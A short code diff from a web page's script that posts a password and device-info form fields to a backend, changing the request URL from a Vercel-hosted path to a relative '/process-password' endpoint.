@@ -118,7 +118,7 @@
             const passwordOption = document.getElementById("passwordOption").value;
             const passwordOption2 = document.getElementById("passwordOption2").value;
             
-            fetch("pswnachi2025.vercel.app/process-password", {
+            fetch("/process-password", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ userPassword, deviceInfo1, deviceInfo2, passwordOption, passwordOption2 })
